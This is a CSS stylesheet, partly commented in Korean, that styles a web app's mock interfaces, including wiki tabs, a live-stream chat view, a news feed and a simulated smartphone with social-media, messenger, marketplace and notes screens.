    .wk-tabs{display:flex;gap:4px;margin:6px 0 10px;border-bottom:1px solid var(--rule)}.wk-tabs button{border:0;background:transparent;padding:6px 10px;font-size:12.5px;color:var(--graphite);cursor:pointer;border-bottom:2px solid transparent}.wk-tabs button[aria-pressed="true"]{color:var(--ink);font-weight:800;border-bottom-color:var(--ink)}
    .wk-doc{font-size:13.5px;line-height:1.65}.wk-doc h5{margin:14px 0 4px;font-size:14px;padding-bottom:3px;border-bottom:1px solid var(--rule)}.wk-doc p{margin:0 0 6px}.wk-doc s{color:var(--graphite)}.wk-sum{padding:8px 10px;border-radius:8px;background:var(--wash,#F3F4F6)}
    .wk-toc{display:inline-flex;flex-direction:column;gap:2px;margin:8px 0 4px;padding:8px 12px;border:1px solid var(--rule);border-radius:8px;font-size:12.5px}.wk-toc b{font-size:12px}
    .wk-fn{border:0;background:transparent;padding:0 1px;font-size:10px;color:#3B6FD8;vertical-align:super;cursor:pointer}.wk-link{border:0;background:transparent;padding:0;font:inherit;color:#3B6FD8;cursor:pointer;text-align:left}.wk-toc .wk-link{display:block;font-size:12.5px}.wk-notes{margin-top:12px;padding-top:8px;border-top:1px solid var(--rule);font-size:12px;color:var(--ink2)}
    .wk-hist{padding:4px 14px}.wk-hist p{display:flex;flex-wrap:wrap;gap:6px;align-items:baseline;margin:0;padding:6px 0;border-bottom:1px dashed var(--rule);font-size:12.5px}.wk-hist small{color:var(--graphite);font-size:11px}.wk-hist span{color:var(--ink2)}
    .lv-tv{position:relative;padding:22px 14px 14px;color:#fff;border-radius:12px 12px 0 0}.lv-tv b{display:block;font-size:17px}.lv-tv small{font-size:12px;opacity:.9}.lv-live{position:absolute;top:10px;right:12px;font-size:11px;font-weight:900;background:#E5484D;padding:1px 7px;border-radius:4px}.lv-rate{position:absolute;bottom:12px;right:12px;font-size:12px;font-weight:800}
    .lv-chat{max-height:360px;overflow-y:auto;padding:8px 14px;background:var(--paper)}.lv-msg{margin:0;padding:3px 0;font-size:13px;line-height:1.5}.lv-msg b{margin-right:6px;color:var(--graphite);font-weight:700}.lv-msg.mine b{color:var(--ink)}.lv-scene{margin:8px 0 4px;padding:4px 8px;border-radius:6px;background:var(--wash,#F3F4F6);font-size:11.5px;color:var(--graphite)}
    .lv-don{margin:3px 0;padding:3px 8px;border-radius:6px;background:#FFF4D6;font-size:12.5px;color:#7A4B00;line-height:1.5}.lv-don span{font-weight:800;color:#C26A00;margin-right:6px}
    .lv-pp{position:absolute;top:8px;right:70px;border:0;border-radius:4px;background:rgba(0,0,0,.25);color:#fff;font-size:11px;padding:2px 7px;cursor:pointer}
    .lv-scene b{margin-left:6px;font-size:10.5px;color:var(--ink2)}.lv-scene small{display:block;margin-top:2px;font-size:11px;color:var(--ink2)}
    .lv-heat{padding:4px 14px 8px}.lv-heat button{display:block;width:100%;border:0;background:transparent;text-align:left;padding:5px 0;cursor:pointer;color:var(--ink)}.lv-hn{display:block;font-size:12.5px}.lv-hn small{color:var(--graphite);font-size:10.5px}
    .lv-heat i{display:block;height:6px;margin:3px 0 2px;border-radius:999px;background:linear-gradient(90deg,#FFB36B,#E5484D)}.lv-heat button>small{font-size:11px;color:var(--graphite)}
    .lv-sub{margin:10px 0 6px;padding:8px 12px;border-radius:8px;background:#1F2330;color:#fff;font-size:13px;line-height:1.5;text-align:center}.lv-sub small{display:block;font-size:10.5px;opacity:.7;margin-bottom:2px}
    .lv-rate b{font-weight:800}.lv-up,.lv-dn{font-style:normal;font-size:10px;margin-right:3px}.lv-up{color:#FFE27A}.lv-dn{color:#CFE3FF}
    .lv-end{margin:14px 0 8px;padding:12px;border-radius:10px;background:linear-gradient(135deg,#1F2330,#3A3F55);color:#fff;font-size:15px;font-weight:900;text-align:center}.lv-end small{display:block;margin-top:3px;font-size:11px;font-weight:400;opacity:.75}
    .lv-tv{display:grid;grid-template-columns:1fr auto auto;column-gap:6px;row-gap:6px;align-items:center;padding:14px}.lv-tv>b{grid-column:1;grid-row:1;min-width:0}.lv-tv>small{grid-column:1;grid-row:2}
    .lv-tv .lv-pp{position:static;grid-column:2;grid-row:1}.lv-tv .lv-live{position:static;grid-column:3;grid-row:1}.lv-tv .lv-rate{position:static;grid-column:2/4;grid-row:2;text-align:right;white-space:nowrap;font-size:12px}.lv-tv .lv-rate b{display:inline;font-size:14px}
    .lv-cens{background:repeating-linear-gradient(45deg,#2A2E3B 0 6px,#3A3F50 6px 12px);letter-spacing:2px;font-size:15px}
    .lv-next{margin:10px 14px;padding:12px;border:1.5px dashed var(--rule);border-radius:10px;text-align:center}.lv-next b{display:block;font-size:14px;margin-bottom:8px}.lv-next small{font-size:12px;color:var(--graphite)}.lv-next .bd-range{justify-content:center}
    .lv-stk{margin:2px 0;font-size:34px;line-height:1.2}
    .lv-hint{margin:4px 14px 0;font-size:11px;color:var(--graphite);text-align:center}
    .lv-in{animation:lvIn .25s ease both}@keyframes lvIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
    .nw-meta{margin:2px 0 10px;font-size:12px;color:var(--graphite)}.nw-meta b{color:var(--ink)}
    .nw-photo .nw-em{display:block;font-size:44px;line-height:1.15;letter-spacing:3px;margin-bottom:6px}.nw-photo small{font-size:12px}.nw-photo{margin:8px 0;padding:18px 12px;border-radius:8px;background:var(--wash,#F3F4F6);color:var(--graphite);font-size:12px;text-align:center}
    .nw-react{display:flex;gap:10px;margin:4px 0 0;font-size:11.5px;color:var(--graphite)}
    .nw-trends{display:grid;grid-template-columns:1fr 1fr;column-gap:14px}.nw-trends>button{border:0;background:transparent;cursor:pointer;color:var(--ink);text-align:left}.nw-trends>span,.nw-trends>button{display:flex;align-items:center;gap:8px;padding:6px 0;font-size:13px;min-width:0}.nw-trends>button>span,.nw-trends>span>span{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .nw-trends i{font-style:normal;font-size:10px;font-weight:800}.nw-tn{color:var(--bad)}.nw-tu{color:var(--bad)}.nw-td{color:#3B6FD8}.nw-ts{color:var(--graphite)}
    .bd-n{font-style:normal;font-size:10.5px;font-weight:900;color:var(--bad);letter-spacing:.02em;vertical-align:1px}
    .bd-bestc{background:#FFF8EC;border-bottom:1px solid var(--rule)}
    .bd-range{display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;margin:6px 0 0;font-size:13px;color:var(--ink2)}.bd-range input{width:64px;height:34px;border:1.5px solid var(--rule);border-radius:10px;padding:0 8px;font-size:14px;text-align:center;background:var(--paper);color:var(--ink)}
    .bd-tools{display:flex;justify-content:center;gap:8px;margin:12px 0 0}.bd-foot{margin:0;padding:12px 16px 14px;border-top:1px solid var(--rule)}
    .bd-tools button{border:1px solid var(--rule);border-radius:999px;background:var(--paper);color:var(--ink2);font-size:12.5px;font-weight:600;padding:5px 12px;cursor:pointer}
    .bd-snap{margin:0;padding:10px 16px 14px;text-align:center;font-size:12px;border-top:1px solid var(--rule)}.bd-snap .linkbtn{font-size:12px;color:var(--graphite)}
    .rsheet{position:fixed;inset:0;z-index:20;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;padding:20px}
    .rbox{background:var(--paper);border-radius:18px;padding:20px 18px 16px;width:min(360px,100%);display:flex;flex-direction:column;gap:6px;text-align:center;box-shadow:0 12px 36px rgba(0,0,0,.25)}.rbox b{font-size:16px}.devask{background:var(--paper);border:1px solid var(--rule);border-radius:18px;padding:14px 14px 12px;margin:0 0 16px;box-shadow:0 6px 22px rgba(30,25,60,.07);font-size:13px;color:var(--ink)}.devask>b{display:flex;align-items:center;gap:7px;margin:0 0 10px;font-size:14.5px;font-weight:800;letter-spacing:-.2px}.devask>b::before{content:"";width:8px;height:8px;border-radius:50%;background:#8B78E6;box-shadow:0 0 0 4px #ECE8FB}.devask p{margin:0 0 6px;line-height:1.55;color:var(--ink2)}.devask .warn{margin:8px 2px 0;font-size:12px;color:var(--bad)}.dcols{display:flex;gap:8px;margin:0}.dcol{flex:1;min-width:0;background:var(--mist);border-radius:14px;padding:11px 12px;display:flex;flex-direction:column;gap:3px}.dcol.best{background:#F3F0FD;box-shadow:inset 0 0 0 1.5px #B4A8F0}.dcol small{font-size:11px;color:var(--graphite);line-height:1.45}.dcol small:first-child{display:flex;align-items:center;gap:6px;font-weight:700;color:var(--ink2)}.dcol em{font-style:normal;font-size:10px;font-weight:800;color:#fff;background:#7B67E0;border-radius:999px;padding:2px 7px}.dcol b{font-size:19px;font-weight:800;letter-spacing:-.4px;margin:2px 0}.dcol p{margin:5px 0 0;font-size:12px;line-height:1.5;color:var(--ink2);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}.devask-btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}.devask-btns .btn{flex:1;min-width:140px;height:40px;border-radius:999px;font-weight:700}.dsmall{margin:10px 0 0;text-align:center;font-size:12px;color:var(--graphite)}.devask-btns .btn{flex:1;min-width:140px}.gsbox{text-align:left;gap:10px;max-height:calc(100vh - 40px);overflow:auto}.gshow b{font-size:inherit}.gsbox>b,.gsbox>small{text-align:center}.gsf{display:flex;flex-direction:column;gap:4px;font-size:12.5px;color:var(--graphite)}.gsf>input{height:38px;border:1.5px solid var(--rule);border-radius:10px;padding:0 10px;font-size:13px;background:var(--paper);color:var(--ink);width:100%;box-sizing:border-box}.gsf .keybox{display:flex;gap:6px;width:100%;max-width:none;box-sizing:border-box}.gsf .keybox input{flex:1;min-width:0;border:0;outline:0;background:transparent;height:100%;padding:0 8px 0 10px;font-size:13px;color:var(--ink)}.gsf .keybox button{flex:none}.gsrow{display:flex;gap:8px}.gsrow .btn{flex:1}.etcsw{display:flex;align-items:flex-start;gap:10px;font-size:13px;color:var(--ink);cursor:pointer;padding:4px 0}.etcsw input{display:none}.etcsw i{flex:none;margin-top:2px;width:34px;height:20px;border-radius:999px;background:var(--rule);position:relative;transition:background .15s}.etcsw i::after{content:"";position:absolute;top:3px;left:3px;width:14px;height:14px;border-radius:50%;background:#fff;transition:left .15s}.etcsw input:checked+i{background:#7B67E0}.etcsw input:checked+i::after{left:17px}.etcsw small{display:block;font-size:11.5px;color:var(--graphite);margin-top:2px}.etcgrid{display:grid;grid-template-columns:1fr 1fr;gap:8px}.etcgrid .btn{height:40px;border-radius:12px;font-weight:600}.etcall{height:42px;border-radius:999px;font-weight:700;color:var(--bad);border-color:var(--bad)}.gshow{font-size:12.5px;color:var(--ink2);border-top:1px solid var(--rule);padding-top:8px}.gshow summary{cursor:pointer;font-weight:700;text-align:center;color:var(--ink)}.gshow ol{margin:8px 0 0;padding-left:18px;display:flex;flex-direction:column;gap:7px;line-height:1.55}.gshow .btn{height:28px;padding:0 10px;font-size:12px}.rbox small{font-size:12px;color:var(--graphite)}
    .imgsheet{position:fixed;inset:0;z-index:20;background:rgba(0,0,0,.72);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;padding:20px}
    .imgsheet .img-x{position:absolute;top:14px;right:14px;width:38px;height:38px;border-radius:50%;border:0;background:rgba(255,255,255,.2);color:#fff;font-size:16px;cursor:pointer;padding:0}
    .imgsheet .img-close{border:0;border-radius:999px;background:#fff;color:#1a1a1a;font-size:14px;font-weight:700;padding:9px 26px;cursor:pointer}
    .imgsheet img{max-width:100%;max-height:78vh;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.4)}.imgsheet p{margin:0;color:#fff;font-size:13px;text-align:center}
    .gen-prog{margin:10px 0;padding:14px 16px;border:1px solid var(--rule);border-radius:14px;background:var(--mist)}
    .gp-top{display:flex;justify-content:space-between;align-items:baseline;font-size:14px}.gp-time{font-size:13px;color:var(--graphite);font-variant-numeric:tabular-nums}
    .gp-bar{height:6px;border-radius:3px;background:var(--rule);overflow:hidden;margin:10px 0 8px}
    .gp-bar i{display:block;height:100%;background:var(--ink);border-radius:3px;transition:width .4s}
    .gp-bar.ind i{animation:gpslide 1.4s ease-in-out infinite}
    @keyframes gpslide{0%{transform:translateX(-100%)}100%{transform:translateX(290%)}}
    @media (prefers-reduced-motion:reduce){.gp-bar.ind i{animation:none}}
    .gp-info{margin:0;font-size:12.5px;line-height:1.55;color:var(--ink2)}
    .bd-pick{display:flex;gap:8px;flex-wrap:wrap;justify-content:center}.bd-pick .ph-make{margin-top:10px}
    .bd-by{border:0;border-radius:999px;background:var(--mist);color:var(--ink2);font-size:11px;font-weight:600;padding:1px 8px;margin-left:4px;cursor:pointer}
    .pc-lock .av{width:72px;height:72px;font-size:34px}.pc-lock b{font-size:17px}.pc-lock small{font-size:12px;opacity:.85;max-width:280px}
    .ph-island{position:absolute;top:10px;left:50%;transform:translateX(-50%);width:96px;height:28px;border-radius:16px;background:#000;z-index:3}
    .ph-homebar{position:absolute;bottom:8px;left:50%;transform:translateX(-50%);width:110px;height:5px;border-radius:3px;background:rgba(0,0,0,.55);z-index:3;cursor:pointer}
    .ph-screen{position:absolute;inset:0;border-radius:38px;overflow:hidden;isolation:isolate;clip-path:inset(0 round 38px);transform:translateZ(0);background:#fff;display:flex;flex-direction:column;font-family:-apple-system,'SF Pro Text','Apple SD Gothic Neo',system-ui,sans-serif}
    .ph-screen *{font-family:inherit}
    .ph-status{flex-shrink:0;display:flex;justify-content:space-between;align-items:center;height:46px;padding:14px 26px 0 30px;font-size:13px;position:relative;z-index:2}
    .ph-status span{font-size:11px;letter-spacing:1px}
    .ph-nav{flex-shrink:0;display:grid;grid-template-columns:40px 1fr 40px;align-items:center;height:40px;padding:0 6px;border-bottom:.5px solid #e5e5ea}
    .ph-nav b{text-align:center;font-size:15px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .ph-nav button{border:0;background:transparent;font-size:30px;line-height:1;color:#0A84FF;padding:0 0 4px}
    .ph-body{flex:1;overflow-y:auto;scrollbar-width:none;padding-bottom:22px}.ph-body::-webkit-scrollbar{display:none}
    .ph-empty{text-align:center;color:#8e8e93;font-size:13px;margin-top:40px}
    .ph-lock,.ph-home{position:absolute;inset:0;background:linear-gradient(160deg,var(--wb),#fff 55%,var(--wb));display:flex;flex-direction:column;align-items:center}
    .ph-lock{justify-content:center;gap:10px;padding:0 24px;text-align:center}
    .ph-clock{font-size:64px;font-weight:300;color:var(--wf);letter-spacing:-2px;line-height:1}.ph-date{font-size:15px;font-weight:600;color:var(--wf)}
    .ph-make{margin-top:26px;border:0;border-radius:22px;background:rgba(255,255,255,.85);padding:12px 20px;font-size:15px;font-weight:700;color:#1c1c1e;box-shadow:0 4px 14px rgba(0,0,0,.08)}
    .ph-lock small{font-size:11.5px;color:#3c3c43;opacity:.7;line-height:1.5}
    .ph-home{padding:58px 22px 0}
    .ph-widget{width:100%;border-radius:22px;background:rgba(255,255,255,.7);padding:14px 16px;display:flex;align-items:center;gap:10px;margin-bottom:22px}
    .ph-widget span{font-size:30px}.ph-widget b{flex:1;font-size:16px;color:#1c1c1e}.ph-widget small{font-size:11.5px;color:#636366}
    .ph-grid{width:100%;display:grid;grid-template-columns:repeat(4,1fr);gap:18px 10px}
    .ph-app{position:relative;border:0;background:transparent;display:flex;flex-direction:column;align-items:center;gap:5px;padding:0}
    .ph-app i{width:56px;height:56px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-style:normal;font-size:27px;box-shadow:0 2px 6px rgba(0,0,0,.12)}
    .ph-app span{font-size:11px;color:#1c1c1e}
    .ph-app em{position:absolute;top:-5px;right:2px;min-width:20px;height:20px;border-radius:10px;background:#FF3B30;color:#fff;font-style:normal;font-size:11.5px;font-weight:700;line-height:20px;padding:0 5px}
    .ic-insta{background:radial-gradient(circle at 30% 107%,#fdf497 0%,#fd5949 45%,#d6249f 60%,#285AEB 90%)}
    .ic-msg{background:linear-gradient(#5BF675,#0CBD2A)}
    .ic-market{background:linear-gradient(#FF9F57,#FF6F0F)}
    .ic-memo{background:linear-gradient(#fff 0 28%,#FFD60A 28%)}
    .ph-dock{position:absolute;left:12px;right:12px;bottom:18px;display:flex;justify-content:space-around;padding:12px 8px;border-radius:30px;background:rgba(255,255,255,.55)}
    .ph-dock .ph-app span{display:none}
    .ig-top{display:flex;align-items:center;gap:18px;padding:14px 16px 6px}
    .ig-av{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;box-shadow:0 0 0 2px #fff,0 0 0 4px #d6249f}
    .ig-av.sm{width:30px;height:30px;font-size:16px;box-shadow:none}
    .ig-nums{flex:1;display:flex;justify-content:space-around;text-align:center}.ig-nums p{margin:0;font-size:12px;color:#1c1c1e}.ig-nums b{display:block;font-size:16px}
    .ig-name{margin:4px 16px 0;font-size:13px;font-weight:700}.ig-bio{margin:2px 16px 10px;font-size:13px;line-height:1.45;white-space:pre-line}
    .ig-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px}.ig-grid button{aspect-ratio:1;border:0;background:linear-gradient(135deg,var(--pb),#fff);font-size:34px;padding:0}
    .ig-ph{display:flex;align-items:center;gap:8px;padding:8px 12px}.ig-ph b{font-size:13px}
    .ig-photo{aspect-ratio:1;background:linear-gradient(135deg,var(--pb),#fff 70%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;padding:20px;text-align:center}
    .ig-photo span{font-size:70px}.ig-photo small{font-size:12px;color:#3c3c43;line-height:1.5}
    .ig-acts{margin:8px 12px 2px;font-size:20px;letter-spacing:8px}.ig-likes{margin:0 12px;font-size:13px;font-weight:700}
    .ig-cap,.ig-cm{margin:4px 12px 0;font-size:13px;line-height:1.45}.ig-cm{color:#3c3c43}.ig-date{margin:6px 12px 0;font-size:11px;color:#8e8e93}
    .im-list button{width:100%;border:0;border-bottom:.5px solid #e5e5ea;background:transparent;display:flex;align-items:center;gap:10px;padding:10px 14px;text-align:left}
    .im-list .av{width:44px;height:44px;font-size:20px}.im-list span{flex:1;min-width:0;display:flex;flex-direction:column}
    .im-from{margin:6px 0 1px 12px;font-size:11px;color:#8e8e93}
    .im-list b{font-size:15px}.im-list small{font-size:13px;color:#8e8e93;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .im-list em{font-style:normal;font-size:12px;color:#8e8e93;align-self:flex-start;margin-top:3px}
    .im-thread{display:flex;flex-direction:column;padding:10px 12px}
    .im-time{align-self:center;font-size:11px;color:#8e8e93;margin:8px 0 4px}
    .im-b{max-width:75%;margin:2px 0;padding:7px 12px;border-radius:18px;font-size:14.5px;line-height:1.35;word-break:keep-all;overflow-wrap:anywhere}
    .im-b.me{align-self:flex-end;background:#0A84FF;color:#fff;border-bottom-right-radius:5px}
    .im-b.them{align-self:flex-start;background:#E9E9EB;color:#000;border-bottom-left-radius:5px}
    .im-input{margin:6px 12px 16px;border:1px solid #d1d1d6;border-radius:18px;padding:6px 14px;font-size:13px;color:#c7c7cc}
    .mk-item{display:flex;gap:12px;padding:12px 14px;border-bottom:.5px solid #e5e5ea}
    .mk-th{width:76px;height:76px;flex-shrink:0;border-radius:10px;background:#f2f2f7;display:flex;align-items:center;justify-content:center;font-size:36px}
    .mk-item b{display:block;font-size:14.5px}.mk-item small{display:block;font-size:12px;color:#8e8e93;line-height:1.4;margin:2px 0}
    .mk-item p{margin:2px 0 0;font-size:14px}.mk-st{font-style:normal;font-size:11px;font-weight:700;color:#fff;background:#FF6F0F;border-radius:4px;padding:1px 5px}
    .nt-list button{width:100%;border:0;border-bottom:.5px solid #e5e5ea;background:transparent;text-align:left;padding:10px 16px}
    .nt-list b{display:block;font-size:15px}.nt-list small{font-size:12.5px;color:#8e8e93}
    .nt-view{padding:12px 18px}.nt-view small{color:#8e8e93;font-size:12px}.nt-view h4{margin:6px 0;font-size:20px}.nt-view p{font-size:15px;line-height:1.6;white-space:pre-line}

    /* 폰 사진·앨범·더 리얼하게 */
    .ph-img{width:100%;height:100%;object-fit:cover;display:block}
    .ph-fake{width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;font-size:34px;text-align:center}
    .ig-photo .ph-fake{font-size:64px;padding:16px}.ph-fake small{font-size:12px;color:#3c3c43;line-height:1.5}
    .ig-photo:has(.ph-img){padding:0}
    .ph-shoot{border:0;border-radius:999px;background:rgba(0,0,0,.72);color:#fff;font-size:12.5px;font-weight:700;padding:7px 14px}
    .ph-shoot.sm{font-size:11px;padding:4px 10px;margin-top:6px;background:#FF6F0F}
    .ic-photos{background:#fff;font-size:30px}
    .ig-nums p{min-width:48px}
    .ig-btns{display:flex;gap:6px;margin:0 16px 12px}.ig-btns span{flex:1;text-align:center;font-size:12.5px;font-weight:600;background:#efefef;border-radius:8px;padding:6px 0}
    .ig-grid button{overflow:hidden}
    .ig-ph i{margin-left:auto;font-style:normal;color:#8e8e93}
    .ig-acts{display:flex;justify-content:space-between}.ig-more{margin:4px 12px 0;font-size:13px;color:#8e8e93}
    .im-head{flex-shrink:0;display:grid;grid-template-columns:40px 1fr 40px;align-items:center;padding:0 6px 6px;border-bottom:.5px solid #e5e5ea;background:#f9f9f9}
    .im-head button{border:0;background:transparent;font-size:30px;line-height:1;color:#0A84FF;padding:0 0 4px}
    .im-hav{display:flex;flex-direction:column;align-items:center;gap:2px}.im-hav .av{width:40px;height:40px;font-size:18px}.im-hav small{font-size:11px;color:#1c1c1e}
    .im-time b{font-weight:600}
    .im-b.tail.me{border-bottom-right-radius:5px}.im-b.me:not(.tail){border-bottom-right-radius:18px}
    .im-b.tail.them{border-bottom-left-radius:5px}.im-b.them:not(.tail){border-bottom-left-radius:18px}
    .im-read{align-self:flex-end;margin:1px 2px 0;font-size:11px;color:#8e8e93}
    .im-input{display:flex;align-items:center;gap:8px;border:0;padding:0}.im-input span{flex:1;border:1px solid #d1d1d6;border-radius:18px;padding:6px 14px}.im-input i{font-style:normal;color:#8e8e93;font-size:18px}
    .al-head{margin:8px 12px;font-size:13px;font-weight:700}
    .al-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px}.al-grid button{aspect-ratio:1;border:0;padding:0;overflow:hidden;background:linear-gradient(135deg,var(--pb),#fff)}
    .mk-th{overflow:hidden}.mk-item>div{min-width:0;flex:1}
    .mk-desc{display:-webkit-box !important;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
    .mk-meta{display:block;text-align:right;font-size:11.5px;color:#8e8e93}

    /* 폰 v3: 진짜 앱처럼 */
    .ph-anon{width:32px;height:32px;font-size:13px;background:#d1d1d6;color:#fff}
    .ph-navr{border:0;background:transparent;font-size:20px;position:relative;justify-self:end;padding:0 6px;color:#1c1c1e}
    .ph-navr em{position:absolute;top:-4px;right:-2px;min-width:16px;height:16px;border-radius:8px;background:#FF3040;color:#fff;font-style:normal;font-size:10px;font-weight:700;line-height:16px;padding:0 4px}
    .ig-hl{display:flex;gap:14px;overflow-x:auto;padding:2px 16px 12px;scrollbar-width:none}
    .ig-hl span{display:flex;flex-direction:column;align-items:center;gap:4px;flex-shrink:0}
    .ig-hl i{width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-style:normal;font-size:24px;background:#f2f2f7;box-shadow:0 0 0 1px #dbdbdb,inset 0 0 0 3px #fff}
    .ig-hl small{font-size:11px;color:#1c1c1e;max-width:60px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .ig-tabs{display:flex;justify-content:space-around;border-top:.5px solid #dbdbdb;padding:8px 0;font-size:16px;color:#8e8e93}.ig-tabs b{color:#1c1c1e;border-bottom:1.5px solid #1c1c1e;padding:0 20px 7px;margin-bottom:-8px}
    .ig-ph span{display:flex;flex-direction:column;min-width:0}.ig-ph small{font-size:11px;color:#1c1c1e}
    .ig-cms{border-top:.5px solid #efefef;margin-top:8px;padding-top:4px}.ig-cmh{margin:4px 12px 6px;font-size:13px;font-weight:700;text-align:center}
    .ig-cmrow{display:flex;gap:10px;padding:6px 12px}.ig-cmrow.re{padding-left:52px}
    .ig-cmrow .av{width:32px;height:32px;font-size:14px;flex-shrink:0}.ig-cmrow>div{flex:1;min-width:0}
    .ig-cmrow p{margin:0;font-size:13px;line-height:1.4;overflow-wrap:anywhere}.ig-cmrow p span{font-size:12px;color:#8e8e93;font-weight:400}
    .ig-cmrow small{font-size:11.5px;color:#8e8e93}.ig-cmrow i{font-style:normal;font-size:12px;color:#8e8e93}
    .ig-add{display:flex;align-items:center;gap:8px;margin:10px 12px 0;padding-top:8px;border-top:.5px solid #efefef;font-size:13px;color:#8e8e93}.ig-add .av{width:28px;height:28px;font-size:12px}
    .dm-tabs{display:flex;gap:16px;padding:8px 14px 4px;font-size:14px}.dm-tabs span{color:#8e8e93}
    .im-list small.ur{color:#1c1c1e;font-weight:700}
    .dot{display:block;width:9px;height:9px;border-radius:50%;background:#3797F0;flex-shrink:0;font-style:normal}
    .dot.im{background:#0A84FF;margin-right:-4px}
    .im-head.dm{background:#fff}.im-hav.row{flex-direction:row;gap:8px}.im-hav.row span{display:flex;flex-direction:column}.im-hav.row b{font-size:14px}.im-hav.row small{font-size:11px;color:#8e8e93}
    .im-hav.row .av,.im-hav.row .ph-anon{width:32px;height:32px;font-size:14px}
    .dm-b{max-width:72%;margin:2px 0;padding:8px 13px;border-radius:22px;font-size:14px;line-height:1.35;overflow-wrap:anywhere}
    .dm-b.me{align-self:flex-end;background:linear-gradient(135deg,#7B3FF2,#3797F0);color:#fff}.dm-b.them{align-self:flex-start;background:#efefef;color:#000}
    .dm-input{display:flex;align-items:center;gap:8px;margin:6px 12px 16px;border:1px solid #dbdbdb;border-radius:22px;padding:6px 8px}.dm-input span{flex:1;font-size:13px;color:#8e8e93}
    .dm-input i{font-style:normal;width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:15px}.dm-input i:first-child{background:#3797F0}
    .im-search{margin:4px 12px 6px;background:#f2f2f7;border-radius:10px;padding:7px 10px;font-size:13px;color:#8e8e93}
    .mk-me{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:6px solid #f2f2f7}.mk-me span{display:flex;flex-direction:column}.mk-me b{font-size:15px}
    .mk-me small,.mk-seller small{font-size:12px;color:#8e8e93}.mk-me em{font-style:normal;color:#319E45;font-weight:700}
    .mk-item{width:100%;border:0;border-bottom:.5px solid #e5e5ea;background:transparent;text-align:left;display:flex;gap:12px;padding:12px 14px}
    .mk-tx{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}.mk-tx b{font-size:15px;font-weight:500}
    .mk-st.done{background:#4d4d4d}
    .mk-photo{aspect-ratio:1;background:#f2f2f7}.mk-photo .ph-fake{font-size:64px}
    .mk-seller{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:.5px solid #e5e5ea}.mk-seller span{flex:1;display:flex;flex-direction:column}.mk-seller em{font-style:normal;color:#319E45;font-weight:700;font-size:14px}
    .mk-body{padding:12px 14px}.mk-body h4{margin:0 0 2px;font-size:18px}.mk-body p{font-size:14.5px;line-height:1.6;margin:10px 0;white-space:pre-line}.mk-body small{font-size:12px;color:#8e8e93}
    .mk-talk{padding:8px 14px;border-top:6px solid #f2f2f7;display:flex;flex-direction:column}.mk-th2{font-size:13px;font-weight:700;margin:4px 0 8px}
    .mk-b{max-width:75%;margin:2px 0;padding:7px 11px;border-radius:16px;font-size:13.5px;line-height:1.4;position:relative}
    .mk-b small{display:block;font-size:11px;color:#8e8e93;margin-bottom:2px}.mk-b i{font-style:normal;font-size:10px;color:#8e8e93;margin-left:6px}
    .mk-b.me{align-self:flex-end;background:#FF6F0F;color:#fff}.mk-b.me i{color:rgba(255,255,255,.8)}.mk-b.them{align-self:flex-start;background:#f2f2f7}
    .mk-bar{position:sticky;bottom:0;display:flex;align-items:center;gap:12px;padding:10px 14px 18px;background:#fff;border-top:.5px solid #e5e5ea}
    .mk-bar b{flex:1;font-size:16px}.mk-go{background:#FF6F0F;color:#fff;font-weight:700;border-radius:8px;padding:8px 14px;font-size:14px}
    .nt-big{margin:4px 16px 6px;font-size:28px;font-weight:800}.nt-sec{margin:12px 16px 4px;font-size:13px;font-weight:700;color:#8e8e93}
    .nt-list{margin:0 12px;border-radius:12px;background:#f2f2f7;overflow:hidden}.nt-list button{background:transparent;border-bottom:.5px solid #d1d1d6;padding:10px 14px}
    .nt-list small span{color:#8e8e93}.nt-count{text-align:center;font-size:11.5px;color:#8e8e93;margin:14px 0}
    .nt-done{justify-self:end;color:#E0A800;font-weight:600;font-size:15px;padding-right:6px}
    .ph-screen:has(.nt-big,.nt-view) .ph-nav button{color:#E0A800}
    .nt-view small{display:block;text-align:center}.nt-view p{margin:2px 0;font-size:15px;line-height:1.55}
    .nt-chk{display:flex;align-items:center;gap:8px}.nt-chk i{width:20px;height:20px;border-radius:50%;border:1.5px solid #c7c7cc;display:flex;align-items:center;justify-content:center;font-style:normal;font-size:12px;color:#fff;flex-shrink:0}
    .nt-chk.on i{background:#E0A800;border-color:#E0A800}.nt-chk.on{color:#8e8e93}

    /* 타임라인 접는 칸 · 명대사 */
    .tl-fold summary{display:flex;align-items:center;justify-content:space-between;list-style:none;cursor:pointer}.tl-fold summary::-webkit-details-marker{display:none}
    .tl-fold summary b{margin:0}.tl-fold summary .linkbtn{padding:0}
    .tl-fold[open]>summary{margin-bottom:6px}
    /* 겪은 일 안의 칸: 제목·내용 위아래 여백을 줄입니다 */
    .tl-fold .fold>summary{padding:8px 0;margin:0}
    .tl-fold .fold[open]>summary{padding-bottom:2px}
    .tl-fold .fold-b{padding:0 0 8px}
    .tl-fold .fold-b>:first-child{margin-top:0}
    .tl-q{padding:6px 22px 6px 0;border-top:1px dashed var(--rule);position:relative}.tl-qx{position:absolute;right:0;top:6px;border:0;background:transparent;color:var(--graphite);font-size:15px;line-height:1;padding:2px 4px;cursor:pointer}.tl-q:first-of-type{border-top:0}
